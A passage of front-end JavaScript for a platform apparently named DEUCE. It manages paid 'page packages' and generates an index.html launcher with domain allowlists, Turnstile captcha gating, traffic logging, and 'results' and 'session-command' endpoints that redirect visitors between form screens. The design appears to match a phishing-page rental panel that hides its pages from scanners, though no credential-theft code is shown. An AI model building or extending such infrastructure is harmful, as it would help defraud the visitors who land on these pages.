  const headers = new Headers(request.headers);
  headers.set("x-deuce-relay-secret", RELAY_SECRET);
  headers.set("x-deuce-client-host", url.hostname);

  return fetch(target.toString(), {
    method: request.method,
    headers,
    body: request.method === "GET" || request.method === "HEAD" ? undefined : request.body
  });
}`;
}

function hostingTypeOptions(selectedType = "render-static-site") {
  return [
    ["render-static-site", "Static Site"],
    ["cpanel", "cPanel"],
    ["vps", "VPS"],
    ["shared-hosting", "Shared hosting"],
    ["custom-server", "Custom server"]
  ].map(([value, label]) => `<option value="${value}" ${selectedType === value ? "selected" : ""}>${label}</option>`).join("");
}

function hostingTypeLabel(value = "cpanel") {
  return {
    "render-static-site": "Static Site",
    cpanel: "cPanel",
    vps: "VPS",
    "shared-hosting": "Shared hosting",
    "custom-server": "Custom server"
  }[value] || value;
}

function setupStepClass(done, active = false) {
  if (done) return "done";
  return active ? "active" : "";
}

function goLiveChecklistMarkup(items = []) {
  return `
    <article class="security-panel go-live-checklist">
      <div class="builder-heading">
        <div>
          <small>readiness checklist</small>
          <h3>Before download</h3>
        </div>
        <strong>${items.filter((item) => item.done).length}/${items.length}</strong>
      </div>
      <div>
        ${items.map((item) => `
          <span class="${item.done ? "is-ready" : "is-waiting"}">
            <b>${item.done ? "Ready" : "Needed"}</b>
            <strong>${escapeHtml(item.label)}</strong>
            <small>${escapeHtml(item.detail)}</small>
          </span>
        `).join("")}
      </div>
    </article>
  `;
}

function packageForUserPage(page) {
  const snapshot = page?.configs?.runtimePackageSnapshot;
  if (snapshot?.packageManifest?.screens?.length) return snapshot;
  const packages = [...marketPages, ...adminPackages];
  return packages.find((pagePackage) => (
    pagePackage.id === page.packageId
    || pagePackage.slug === page.slug
    || pagePackage.slug === page.pageId
  )) || null;
}

function packageEntryFile(pagePackage) {
  const screens = pagePackage?.packageManifest?.screens || [];
  const entryScreenId = pagePackage?.packageManifest?.entryScreenId || "";
  return screens.find((screen) => screen.id === entryScreenId && screen.enabled !== false)?.file
    || screens.find((screen) => screen.role === "entry" && screen.enabled !== false)?.file
    || screens.find((screen) => screen.enabled !== false)?.file
    || "";
}

function sessionTargetLabel(screen, fallback = "Page") {
  const value = typeof screen === "string"
    ? screen
    : screen?.buttonLabel || screen?.label || screen?.name || screen?.title || screen?.file || fallback;
  return String(value)
    .replace(/\\/g, "/")
    .split("/")
    .pop()
    .replace(/\.html?$/i, "")
    .replace(/[-_]+/g, " ")
    .replace(/\b\w/g, (letter) => letter.toUpperCase())
    .trim() || fallback;
}

function sessionTargetFile(screen, manifestScreens = []) {
  if (typeof screen === "string") {
    const flowName = screen.trim();
    const matched = manifestScreens.find((item) => (
      String(item.name || "").toLowerCase() === flowName.toLowerCase()
      || String(item.file || "").toLowerCase() === flowName.toLowerCase()
    ));
    return matched?.file || (/\.html?$/i.test(flowName) ? flowName : "");
  }
  return String(screen?.file || screen?.path || screen?.href || "").trim();
}

function refreshImportedScreenOrder() {
  const rows = [...preview.querySelectorAll("[data-package-screen-row]")];
  rows.forEach((row, index) => {
    const order = row.querySelector("strong");
    const position = row.querySelector("em");
    if (order) order.innerHTML = `&#8942;&#8942; ${String(index + 1).padStart(2, "0")}`;
    if (position) {
      const isEntry = Boolean(row.querySelector("[data-package-screen-entry]")?.checked);
      const isFinal = Boolean(row.querySelector("[data-package-screen-final]")?.checked);
      position.textContent = isEntry ? "Entry" : isFinal ? "Final" : "Screen";
    }
    row.querySelector('[data-package-screen-move="up"]')?.toggleAttribute("disabled", index === 0);
    row.querySelector('[data-package-screen-move="down"]')?.toggleAttribute("disabled", index === rows.length - 1);
  });
}

function collectAdminPackagePayload(page) {
  const value = (name, fallback = "") => preview.querySelector(`[data-package-field="${name}"]`)?.value.trim() ?? fallback;
  const billingPeriods = {};
  for (const period of ["daily", "weekly", "biweekly", "monthly"]) {
    const number = Number(preview.querySelector(`[data-package-price="${period}"]`)?.value);
    if (!Number.isFinite(number) || number < 0 || number > 100000) throw new Error(`${period} price must be between 0 and 100000`);
    billingPeriods[period] = Math.round(number * 100) / 100;
  }
  const designTokens = { ...(page.designTokens || {}) };
  preview.querySelectorAll("[data-package-token]").forEach((field) => { designTokens[field.dataset.packageToken] = field.value.trim(); });
  const rows = [...preview.querySelectorAll("[data-package-screen-row]")];
  const mappedScreens = rows.map((row, order) => {
    const id = String(row.dataset.packageScreenId || "").trim();
    const file = String(row.dataset.packageScreenFile || "").trim();
    const buttonLabel = row.querySelector("[data-package-screen-label]")?.value.trim() || "";
    if (!buttonLabel) throw new Error(`Enter a redirect button name for ${file}`);
    return {
      id,
      file,
      buttonLabel,
      stage: row.querySelector("[data-package-screen-stage]")?.value || "other",
      state: row.querySelector("[data-package-screen-state]")?.value || "default",
      enabled: Boolean(row.querySelector("[data-package-screen-enabled]")?.checked),
      showInRedirects: Boolean(row.querySelector("[data-package-screen-redirect]")?.checked),
      needsReview: false,
      order
    };
  });
  const entryScreenId = rows.find((row) => row.querySelector("[data-package-screen-entry]")?.checked)?.dataset.packageScreenId || "";
  const finalScreenId = rows.find((row) => row.querySelector("[data-package-screen-final]")?.checked)?.dataset.packageScreenId || "";
  if (mappedScreens.length && !entryScreenId) throw new Error("Select one entry screen before saving");
  const packageManifest = {
    ...(page.packageManifest || {}),
    schemaVersion: 2,
    entryScreenId,
    finalScreenId,
    type: value("type", page.type || page.sourceType || "Page package"),
    description: value("description", page.description || ""),
    screens: mappedScreens
  };
  return {
    name: value("name", page.name),
    slug: value("slug", page.slug).toLowerCase(),
    version: value("version", page.version || "v0.1"),
    status: value("status", page.status || "draft").toLowerCase(),
    sourceType: value("sourceType", page.sourceType || "upload"),
    repoUrl: value("repoUrl", page.repoUrl || ""),
    billingPeriods,
    screens: mappedScreens.map((screen) => screen.buttonLabel),
    designTokens,
    packageManifest
  };
}

async function saveAdminPackage(page, { rerender = true } = {}) {
  if (!page) throw new Error("Package not found");
  const payload = collectAdminPackagePayload(page);
  await requestApi(`/api/admin/packages/${encodeURIComponent(page.id || page.slug)}`, {
    method: "PATCH",
    body: JSON.stringify(payload)
  });
  const verification = await requestApi(`/api/admin/packages/${encodeURIComponent(page.id || page.slug)}`);
  const updated = normalizePackage(verification.package);
  const pricesMatch = ["daily", "weekly", "biweekly", "monthly"].every((period) => Number(updated.billingPeriods?.[period]) === Number(payload.billingPeriods[period]));
  if (updated.name !== payload.name || updated.version !== payload.version || !pricesMatch) {
    throw new Error("The API responded, but PostgreSQL did not retain all package details and prices");
  }
  adminPackages = adminPackages.map((item) => item.id === updated.id ? updated : item);
  marketPages = adminPackages.filter((item) => item.status === "published");
  if (rerender) {
    window.location.hash = `#admin-package-${updated.slug}`;
    renderAdminPackageEditor(updated.slug);
  }
  statusText.textContent = `${updated.name.toUpperCase()} SAVED`;
  return updated;
}

async function openAdminPackagePreview(page) {
  if (!page) throw new Error("Package not found");
  await openPackagePreview(page);
  statusText.textContent = `${page.name.toUpperCase()} PREVIEW OPENED`;
}

async function publishAdminPackage(page) {
  if (!page) throw new Error("Package not found");
  const inEditor = Boolean(preview.querySelector("[data-package-field]"));
  const current = inEditor ? await saveAdminPackage(page, { rerender: false }) : page;
  const result = await requestApi(`/api/admin/packages/${encodeURIComponent(current.id || current.slug)}/publish`, { method: "POST" });
  const updated = normalizePackage(result.package);
  adminPackages = adminPackages.map((item) => item.id === updated.id ? updated : item);
  marketPages = adminPackages.filter((item) => item.status === "published");
  if (window.location.hash === "#admin-publishing") renderAdminPublishing();
  else if (window.location.hash === "#admin-packages") renderAdminPackages();
  else renderAdminPackageEditor(updated.slug);
  statusText.textContent = `${updated.name.toUpperCase()} PUBLISHED`;
}

async function refreshAdminPackages({ publishing = false } = {}) {
  const result = await requestApi("/api/admin/packages");
  adminPackages = (result.packages || []).map(normalizePackage);
  marketPages = adminPackages.filter((item) => item.status === "published");
  if (publishing) renderAdminPublishing(); else renderAdminPackages();
  statusText.textContent = publishing ? "PUBLISHING QUEUE REFRESHED" : "PACKAGE LIBRARY REFRESHED";
}

function exportAdminUsersCsv() {
  const rows = [["id", "name", "email", "role", "status", "wallet_balance", "page_count", "total_spent"]];
  adminUsers.forEach((user) => rows.push([user.id, user.name, user.email, user.role, user.status, user.walletBalance, user.pages?.length || 0, user.spend?.totalSpent || 0]));
  const csv = rows.map((row) => row.map((value) => `"${String(value ?? "").replace(/"/g, '""')}"`).join(",")).join("\r\n");
  downloadBlob(`deuce-users-${new Date().toISOString().slice(0, 10)}.csv`, csv, "text/csv;charset=utf-8");
  statusText.textContent = "USER EXPORT DOWNLOADED";
}

function downloadBlob(fileName, content, type) {
  const url = URL.createObjectURL(new Blob([content], { type }));
  const link = document.createElement("a");
  link.href = url;
  link.download = fileName;
  document.body.appendChild(link);
  link.click();
  link.remove();
  window.setTimeout(() => URL.revokeObjectURL(url), 1000);
}

function normalizedRuntimeScreenFile(value = "") {
  const file = String(value || "").replace(/\\/g, "/").replace(/^\/+/, "").trim();
  if (!file || file.length > 240 || file.split("/").some((part) => part === "..")) return "";
  return /\.html?$/i.test(file) ? file : "";
}

function sessionPageTargets(page) {
  const pagePackage = packageForUserPage(page);
  const manifestScreens = pagePackage?.packageManifest?.screens || [];
  const serverTargets = Array.isArray(page?.runtimeTargets) ? page.runtimeTargets : [];
  const snapshotScreens = (page?.flow || []).filter((screen) => (
    typeof screen === "object" && normalizedRuntimeScreenFile(screen?.file || screen?.path || screen?.href)
  ));
  const candidates = serverTargets.length
    ? serverTargets
    : snapshotScreens.length
      ? snapshotScreens
      : manifestScreens.length
        ? manifestScreens
        : pagePackage?.screens || [];
  const availableFiles = new Set((pagePackage?.packageManifest?.files || [])
    .map((item) => normalizedRuntimeScreenFile(item?.path || item?.file || item))
    .filter(Boolean)
    .map((file) => file.toLowerCase()));
  const seen = new Set();
  return candidates.reduce((targets, screen) => {
    if (typeof screen === "object" && (screen?.enabled === false || screen?.showInRedirects === false)) return targets;
    const file = normalizedRuntimeScreenFile(sessionTargetFile(screen, manifestScreens));
    const key = file.toLowerCase();
    if (!file || seen.has(key) || (availableFiles.size && !availableFiles.has(key))) return targets;
    seen.add(key);
    targets.push({
      id: screen?.id || key,
      file,
      label: sessionTargetLabel(screen, file),
      role: screen?.role || (targets.length === 0 ? "entry" : "screen"),
      stage: screen?.stage || (screen?.role === "entry" ? "form" : screen?.role) || "other",
      state: screen?.state || "default",
      order: targets.length
    });
    return targets;
  }, []);
}

function shouldUsePackageRuntime(page, pagePackage) {
  const sourceReady = (pagePackage?.sourceType === "github" && pagePackage?.packageManifest?.github)
    || (pagePackage?.sourceType === "r2" && pagePackage?.packageManifest?.r2);
  return Boolean(
    sourceReady
    && packageEntryFile(pagePackage)
    && (page.hostingConfig?.connectionType || "cloudflare-worker") === "cloudflare-worker"
  );
}

function publicLauncherHosting(hostingConfig = {}, liveDomain = "") {
  return {
    domain: liveDomain,
    connectionType: hostingConfig.connectionType || "cloudflare-worker"
  };
}

function publicLauncherGeneratedFile(generatedFile = {}) {
  return {
    version: generatedFile.version || "generated"
  };
}

function createPackageRuntimeIndex(page, pagePackage) {
  const serverApiBase = page.generatedFile?.apiBase || "https://your-render-app.onrender.com";
  const hostingConfig = page.hostingConfig || {};
  const usesCloudflareRelay = hostingConfig.connectionType === "cloudflare-worker";
  const runtimeApiBase = usesCloudflareRelay ? "/api" : `${serverApiBase.replace(/\/$/, "")}/api/runtime`;
  const liveDomain = hostingConfig.domain || page.domain || "";
  const strictAllowedDomains = [normalizeAllowedHost(liveDomain)].filter(Boolean);
  const entryFile = packageEntryFile(pagePackage);
  const payload = {
    id: page.id,
    userId: page.userId,
    packageId: page.packageId,
    packageVersion: page.packageVersion,
    pageId: page.slug,
    pageName: page.name,
    source: {
      type: pagePackage.sourceType,
      entryFile,
      screens: pagePackage.packageManifest?.screens || []
    },
    apiBase: runtimeApiBase,
    generatedAt: new Date().toISOString(),
    domain: liveDomain,
    hosting: publicLauncherHosting(hostingConfig, liveDomain),
    allowedDomains: strictAllowedDomains,
    subscription: page.subscription,
    resultSettings: page.resultSettings,
    security: {
      ...(page.securityConfig || {}),
      turnstile: {
        enabled: Boolean(page.securityConfig?.captcha),
        provider: "turnstile",
        siteKey: page.securityConfig?.turnstile?.siteKey || page.securityConfig?.turnstileSiteKey || "",
        displayDomain: page.securityConfig?.turnstile?.displayDomain || ""
      }
    },
    generatedFile: publicLauncherGeneratedFile(page.generatedFile),
    runtime: {
      mode: "launcher",
      entryFile,
      configEndpoint: `${runtimeApiBase}/config?userPageId=${encodeURIComponent(page.id)}`,
      brandingEndpoint: `${runtimeApiBase}/branding?userPageId=${encodeURIComponent(page.id)}`,
      sourceEndpoint: `${runtimeApiBase}/source?userPageId=${encodeURIComponent(page.id)}`,
      turnstileEndpoint: `${runtimeApiBase}/verify-human`,
      trafficEndpoint: `${runtimeApiBase}/traffic`
    }
  };
  delete payload.security.turnstileSecretKey;
  delete payload.security.secretKey;
  const configJson = JSON.stringify(payload, null, 8).replace(/<\//g, "<\\/");

  return `<!doctype html>
<!-- DEUCE runtime launcher: upload this one index.html. The full page package is served by DEUCE runtime for this subscriber. -->
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>${escapeHtml(page.name)}</title>
    <style>
      :root {
        --accent: #7cffb2;
        --accent-rgb: 124 255 178;
        --success: #15803d;
        --success-rgb: 21 128 61;
        --danger: #b91c1c;
        --danger-rgb: 185 28 28;
        --info: #1d4ed8;
        --info-rgb: 29 78 216;
      }
      * { box-sizing: border-box; }
      html, body { width: 100%; min-height: 100%; margin: 0; background: #050607; }
      body { overflow: hidden; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
      #deuceFrame { width: 100vw; height: 100vh; border: 0; display: block; background: #fff; }
      #deuceFrame.pending { display: none; }
      #deuceGate {
        min-height: 100vh;
        display: none;
        place-items: center;
        padding: 24px;
        color: #152033;
        background:
          radial-gradient(circle at 50% 0, rgba(37, 99, 235, .08), transparent 36%),
          #f4f7fb;
      }
      #deuceGate.active { display: grid; }
      #deuceGate article {
        position: relative;
        width: min(430px, calc(100vw - 32px));
        display: grid;
        gap: 22px;
        padding: 28px;
        overflow: hidden;
        border: 1px solid #dfe5ee;
        border-radius: 18px;
        background: rgba(255, 255, 255, .96);
        box-shadow: 0 24px 70px rgba(15, 23, 42, .12);
      }
      #deuceGate article::before {
        content: "";
        position: absolute;
        inset: 0 0 auto;
        height: 4px;
        background: linear-gradient(90deg, #2563eb, #60a5fa);
      }
      #deuceGateHeader {
        display: flex;
        align-items: center;
        gap: 14px;
        min-width: 0;
      }
      #deuceGateLogo,
      #deuceGateFallback {
        flex: 0 0 52px;
        width: 52px;
        height: 52px;
        border: 1px solid #dbe3ee;
        border-radius: 14px;
        background: #f8fafc;
      }
      #deuceGateLogo {
        display: block;
        object-fit: contain;
        padding: 5px;
      }
      #deuceGateFallback {
        display: grid;
        place-items: center;
        color: #fff;
        background: linear-gradient(135deg, #1d4ed8, #60a5fa);
        font-size: 1rem;
        font-weight: 850;
        letter-spacing: .04em;
      }
      #deuceGateLogo[hidden], #deuceGateFallback[hidden] { display: none; }
      #deuceGateMeta { min-width: 0; }
      #deuceGateEyebrow {
        margin: 0 0 4px;
        color: #64748b;
        font-size: .72rem;
        font-weight: 800;
        letter-spacing: .1em;
        text-transform: uppercase;
      }
      #deuceGateDomain {
        margin: 0;
        overflow-wrap: anywhere;
        color: #0f172a;
        font-size: clamp(1.15rem, 4vw, 1.45rem);
        line-height: 1.2;
      }
      #deuceGateStatus {
        margin: 7px 0 0;
        color: #526176;
        font-size: .92rem;
        line-height: 1.45;
      }
      #deuceGateStatus[data-state="verifying"] { color: var(--info); }
      #deuceGateStatus[data-state="success"] { color: var(--success); }
      #deuceGateStatus[data-state="error"] { color: var(--danger); }
      #deuceTurnstile {
        min-height: 65px;
        display: grid;
        place-items: center;
      }
      #deuceGateFooter {
        margin: -5px 0 0;
        color: #7b8798;
        font-size: .74rem;
        text-align: center;
      }
      @media (max-width: 420px) {
        #deuceGate { padding: 16px; }
        #deuceGate article { padding: 22px 18px; border-radius: 15px; }
        #deuceGateLogo, #deuceGateFallback { flex-basis: 46px; width: 46px; height: 46px; }
      }
      #deuceBlock {
        min-height: 100vh;
        display: none;
        place-items: center;
        padding: 24px;
        color: #eef8f2;
        background: #050607;
      }
      #deuceBlock.active { display: grid; }
      #deuceBlock article {
        max-width: 520px;
        border: 1px solid rgb(var(--accent-rgb) / .24);
        border-radius: 10px;
        padding: 28px;
        background: #0d1112;
      }
      #deuceBlock small { color: var(--accent); font-weight: 800; text-transform: uppercase; }
      #deuceBlock h1 { margin: 10px 0; font-size: 1.7rem; }
      #deuceBlock p { color: #8da199; line-height: 1.55; }
    </style>
  </head>
  <body>
    <iframe id="deuceFrame" title="${escapeHtml(page.name)}"></iframe>
    <section id="deuceGate">
      <article aria-labelledby="deuceGateDomain">
        <header id="deuceGateHeader">
          <img id="deuceGateLogo" alt="" hidden referrerpolicy="no-referrer">
          <div id="deuceGateFallback" aria-hidden="true">DP</div>
          <div id="deuceGateMeta">
            <p id="deuceGateEyebrow">Security check</p>
            <h1 id="deuceGateDomain"></h1>
            <p id="deuceGateStatus" data-state="ready" aria-live="polite">Complete the verification to continue.</p>
          </div>
        </header>
        <div id="deuceTurnstile"></div>
        <p id="deuceGateFooter">Protected by Cloudflare Turnstile</p>
      </article>
    </section>
    <section id="deuceBlock">
      <article>
        <small>access denied</small>
        <h1 id="deuceBlockTitle">ACCESS DENIED</h1>
        <p id="deuceBlockCopy">ACCESS DENIED</p>
      </article>
    </section>
    <script>
      window.DEUCE_PAGE_CONFIG = ${configJson};
      const config = window.DEUCE_PAGE_CONFIG;
      const sessionId = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
      const host = window.location.hostname;
      const frame = document.getElementById("deuceFrame");
      const gate = document.getElementById("deuceGate");
      const gateLogo = document.getElementById("deuceGateLogo");
      const gateFallback = document.getElementById("deuceGateFallback");
      const gateDomain = document.getElementById("deuceGateDomain");
      const gateStatus = document.getElementById("deuceGateStatus");
      const turnstileMount = document.getElementById("deuceTurnstile");
      const block = document.getElementById("deuceBlock");
      const blockCopy = document.getElementById("deuceBlockCopy");
      let turnstileWidgetId = null;

      function normalizeHost(value) {
        return String(value || "").trim().toLowerCase().replace(/^https?:\\/\\//, "").replace(/\\/.*$/, "").replace(/:\\d+$/, "");
      }
      function brandingLabel() {
        return String(
          config.security?.turnstile?.displayDomain
          || config.domain
          || config.pageName
          || host
          || "Protected page"
        ).trim();
      }

      function brandingInitials(value) {
        return String(value || "DP")
          .split(/[^a-z0-9]+/i)
          .filter(Boolean)
          .slice(0, 2)
          .map((part) => part.charAt(0).toUpperCase())
          .join("")
          .slice(0, 2) || "DP";
      }

      function setGateStatus(message, state = "ready") {
        gateStatus.textContent = message;
        gateStatus.dataset.state = state;
      }

      function loadBranding() {
        const label = brandingLabel();
        gateDomain.textContent = label;
        gateFallback.textContent = brandingInitials(config.pageName || label);
        const endpoint = config.runtime?.brandingEndpoint;
        if (!endpoint) return;
        const brandingUrl = new URL(endpoint, window.location.href);
        brandingUrl.searchParams.set("hostname", window.location.hostname);
        gateLogo.onload = () => {
          gateLogo.hidden = false;
          gateFallback.hidden = true;
        };
        gateLogo.onerror = () => {
          gateLogo.hidden = true;
          gateFallback.hidden = false;
        };
        gateLogo.src = brandingUrl.toString();
      }

      async function refreshLiveConfig() {
        if (!config.runtime?.configEndpoint) {
          throw new Error("Live security configuration endpoint is missing");
        }
        const response = await fetch(config.runtime.configEndpoint, {
          method: "GET",
          cache: "no-store",
          headers: { Accept: "application/json" }
        });
        const result = await response.json().catch(() => ({}));
        if (!response.ok || !result.config) {
          throw new Error(result.error || "Live security configuration is unavailable");
        }
        const live = result.config;
        config.domain = live.domain || config.domain;
        config.hosting = live.hosting || config.hosting;
        config.allowedDomains = live.security?.domains || config.allowedDomains || [];
        config.subscription = live.subscription || config.subscription;
        config.security = live.security || {};
        config.resultSettings = live.resultSettings || config.resultSettings;
        config.generatedFile = live.generatedFile || config.generatedFile;
        window.DEUCE_PAGE_CONFIG = config;
        return config;
      }

      function blockPage(message) {
        gate.classList.remove("active");
        frame.remove();
        block.classList.add("active");
        blockCopy.textContent = message;
      }

      function sendTraffic(event, result, reason) {
        if (!config.runtime?.trafficEndpoint) return;
        fetch(config.runtime.trafficEndpoint, {
          method: "POST",
          keepalive: true,
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userPageId: config.id,
            pageId: config.pageId,
            hostname: window.location.hostname,
            event,
            result,
            reason,
            createdAt: new Date().toISOString()
          })
        }).catch(() => {});
      }

      function loadPage() {
        gate.classList.remove("active");
        frame.classList.remove("pending");
        const sourceUrl = new URL(config.runtime.sourceEndpoint, window.location.href);
        sourceUrl.searchParams.set("hostname", window.location.hostname);
        frame.src = sourceUrl.toString();
      }

      function verifyToken(token) {
        return fetch(config.runtime.turnstileEndpoint, {
          method: "POST",
          credentials: "same-origin",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userPageId: config.id,
            pageId: config.pageId,
            sessionId,
            hostname: window.location.hostname,
            token
          })
        }).then(async (response) => {
          const result = await response.json().catch(() => ({}));
          return Boolean(response.ok && result.verified);
        });
      }

      function retryTurnstile(message) {
        setGateStatus(message, "error");
        if (window.turnstile && turnstileWidgetId !== null) {
          window.turnstile.reset(turnstileWidgetId);
        }
      }

      function loadTurnstile() {
        frame.classList.add("pending");
        loadBranding();
        setGateStatus("Complete the verification to continue.", "ready");
        gate.classList.add("active");
        const script = document.createElement("script");
        script.src = "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit";
        script.async = true;
        script.defer = true;
        script.onload = () => {
          if (!window.turnstile) {
            sendTraffic("turnstile_load_failed", "blocked", "Turnstile could not load");
            blockPage("ACCESS DENIED");
            return;
          }
          turnstileWidgetId = window.turnstile.render(turnstileMount, {
            sitekey: config.security.turnstile.siteKey,
            callback: async (token) => {
              setGateStatus("Confirming verification...", "verifying");
              try {
                const verified = await verifyToken(token);
                if (verified) {
                  sendTraffic("turnstile_verified", "allowed", "Passed launcher captcha");
                  setGateStatus("Verified. Opening...", "success");
                  window.setTimeout(loadPage, 350);
                  return;
                }
                sendTraffic("turnstile_verify_failed", "blocked", "Turnstile verification failed");
                retryTurnstile("Verification failed. Please try again.");
              } catch (error) {
                sendTraffic("turnstile_verify_failed", "blocked", "Turnstile verification failed");
                retryTurnstile("Verification could not be confirmed. Please try again.");
              }
            },
            "error-callback": () => {
              sendTraffic("turnstile_verify_failed", "blocked", "Turnstile challenge failed");
              setGateStatus("Verification could not start. Please retry.", "error");
            },
            "expired-callback": () => {
              sendTraffic("turnstile_expired", "blocked", "Turnstile challenge expired");
              setGateStatus("Verification expired. Please try again.", "error");
            }
          });
        };
        script.onerror = () => {
          sendTraffic("turnstile_load_failed", "blocked", "Turnstile could not load");
          blockPage("ACCESS DENIED");
        };
        document.head.appendChild(script);
      }

      async function boot() {
        try {
          await refreshLiveConfig();
        } catch (error) {
          sendTraffic("config_load_failed", "blocked", error.message);
          blockPage("SECURITY CONFIGURATION UNAVAILABLE");
          return;
        }

        const allowedHosts = (config.security?.domains || config.allowedDomains || []).map(normalizeHost).filter(Boolean);
        const captchaRequired = Boolean(config.security?.captchaRequired || config.security?.captcha || config.security?.challengeRequired);
        const siteKey = config.security?.turnstile?.siteKey || "";
        if (allowedHosts.length && !allowedHosts.includes(normalizeHost(host))) {
          blockPage("ACCESS DENIED");
        } else if (captchaRequired && !siteKey) {
          sendTraffic("turnstile_config_missing", "blocked", "Turnstile site key is missing");
          blockPage("SECURITY CONFIGURATION UNAVAILABLE");
        } else if (captchaRequired) {
          loadTurnstile();
        } else {
          loadPage();
        }
      }

      boot();
    <\/script>
  </body>
</html>`;
}

function createGeneratedIndex(page) {
  const pagePackage = packageForUserPage(page);
  if (shouldUsePackageRuntime(page, pagePackage)) {
    return createPackageRuntimeIndex(page, pagePackage);
  }

  const screens = page.flow.map((screenName) => {
    const screen = screenLibrary.find((item) => item.name === screenName);
    return {
      name: screenName,
      type: screen?.type || "Custom screen",
      config: getScreenConfig(page, screenName)
    };
  });
  const serverApiBase = page.generatedFile?.apiBase || "https://your-render-app.onrender.com";
  const securityConfig = page.securityConfig || {};
  const hostingConfig = page.hostingConfig || {};
  const usesCloudflareRelay = hostingConfig.connectionType === "cloudflare-worker";
  const runtimeApiBase = usesCloudflareRelay ? "/api" : `${serverApiBase.replace(/\/$/, "")}/api/runtime`;
  const liveDomain = hostingConfig.domain || page.domain || "";
  const strictAllowedDomains = [normalizeAllowedHost(liveDomain)].filter(Boolean);
  const publicSecurity = {
    ...securityConfig,
    turnstile: {
      enabled: Boolean(securityConfig.captcha),
      provider: "turnstile",
      siteKey: securityConfig.turnstile?.siteKey || securityConfig.turnstileSiteKey || ""
    }
  };
  delete publicSecurity.turnstileSecretKey;
  delete publicSecurity.secretKey;

  const payload = {
    id: page.id,
    userId: page.userId,
    packageId: page.packageId,
    packageVersion: page.packageVersion,
    pageId: page.slug,
    pageName: page.name,
    licenseKey: page.generatedFile?.licenseKey || `${page.id}_${page.packageVersion}`.replace(/[^a-z0-9_]/gi, "_"),
    apiBase: runtimeApiBase,
    generatedAt: new Date().toISOString(),
    domain: liveDomain,
    hosting: publicLauncherHosting(hostingConfig, liveDomain),
    allowedDomains: strictAllowedDomains,
    subscription: page.subscription,
    resultSettings: page.resultSettings,
    security: publicSecurity,
    generatedFile: publicLauncherGeneratedFile(page.generatedFile),
    runtime: {
      configEndpoint: `${runtimeApiBase}/config?userPageId=${encodeURIComponent(page.id)}`,
      brandingEndpoint: `${runtimeApiBase}/branding?userPageId=${encodeURIComponent(page.id)}`,
      resultEndpoint: `${runtimeApiBase}/results`,
      trafficEndpoint: `${runtimeApiBase}/traffic`,
      securityEndpoint: `${runtimeApiBase}/security/check`,
      commandEndpoint: `${runtimeApiBase}/session-command`,
      turnstileEndpoint: `${runtimeApiBase}/verify-human`
    },
    screens
  };
  const configJson = JSON.stringify(payload, null, 8).replace(/<\//g, "<\\/");

  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>${escapeHtml(page.name)}</title>
    <style>
      :root {
        color-scheme: dark;
        --bg: #050607;
        --panel: #0d1112;
        --text: #eef8f2;
        --muted: #8da199;
        --accent: #7cffb2;
        --accent-rgb: 124 255 178;
        --success: #7cffb2;
        --success-rgb: 124 255 178;
        --warning: #f5c451;
        --warning-rgb: 245 196 81;
        --danger: #ff6b7a;
        --danger-rgb: 255 107 122;
        --info: #7cc8ff;
        --info-rgb: 124 200 255;
        --line: rgb(var(--accent-rgb) / .22);
        font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      }
      * { box-sizing: border-box; }
      body {
        min-height: 100vh;
        margin: 0;
        display: grid;
        place-items: center;
        padding: 24px;
        color: var(--text);
        background:
          linear-gradient(115deg, rgba(2,3,3,.98), rgba(7,10,11,.9)),
          repeating-linear-gradient(90deg, rgb(var(--accent-rgb) / .08) 0 1px, transparent 1px 72px),
          var(--bg);
      }
      main {
        width: min(560px, 100%);
        border: 1px solid var(--line);
        border-radius: 10px;
        padding: clamp(22px, 6vw, 38px);
        background: linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.025)), var(--panel);
        box-shadow: 0 28px 90px rgba(0,0,0,.42);
      }
      small {
        color: var(--accent);
        font: 800 .72rem Consolas, monospace;
        text-transform: uppercase;
      }
      h1 { margin: 10px 0 10px; font-size: clamp(1.8rem, 8vw, 3rem); line-height: 1; }
      p { color: var(--muted); line-height: 1.65; }
      form { display: grid; gap: 12px; margin-top: 22px; }
      label { display: grid; gap: 6px; color: var(--muted); font-size: .82rem; }
      input, textarea, select {
        width: 100%;
        min-height: 44px;
        border: 1px solid rgba(255,255,255,.12);
        border-radius: 8px;
        padding: 0 12px;
        color: var(--text);
        background: rgba(255,255,255,.05);
      }
      textarea { min-height: 92px; padding: 12px; resize: vertical; }
      button {
        min-height: 46px;
        border: 1px solid var(--accent);
        border-radius: 8px;
        color: #02120a;
        background: var(--accent);
        font-weight: 900;
        cursor: pointer;
      }
      .meta {
        display: flex;
        justify-content: space-between;
        gap: 12px;
        margin-top: 18px;
        color: var(--muted);
        font: 800 .72rem Consolas, monospace;
      }
      .status {
        display: flex;
        flex-wrap: wrap;
        gap: 8px;
        margin-top: 18px;
      }
      .status span {
        border: 1px solid rgba(255,255,255,.1);
        border-radius: 8px;
        padding: 8px 10px;
        color: var(--muted);
        background: rgba(255,255,255,.04);
        font: 800 .72rem Consolas, monospace;
      }
      .captcha-box {
        display: none;
        gap: 16px;
        min-height: 132px;
        margin-top: 4px;
        padding: 16px;
        border: 1px solid rgb(var(--accent-rgb) / .2);
        border-radius: 12px;
        color: var(--muted);
        background: rgba(255,255,255,.04);
      }
      .captcha-box.active { display: grid; }
      .captcha-brand {
        display: flex;
        align-items: center;
        gap: 11px;
        min-width: 0;
      }
      .captcha-logo,
      .captcha-fallback {
        flex: 0 0 42px;
        width: 42px;
        height: 42px;
        border: 1px solid rgba(255,255,255,.13);
        border-radius: 10px;
      }
      .captcha-logo {
        display: block;
        padding: 4px;
        object-fit: contain;
        background: #f8fafc;
      }
      .captcha-fallback {
        display: grid;
        place-items: center;
        color: #03170d;
        background: var(--accent);
        font: 900 .8rem Consolas, monospace;
      }
      .captcha-logo[hidden], .captcha-fallback[hidden] { display: none; }
      .captcha-copy { min-width: 0; }
      .captcha-domain {
        margin: 0 0 4px;
        overflow-wrap: anywhere;
        color: var(--text);
        font-size: .92rem;
        font-weight: 850;
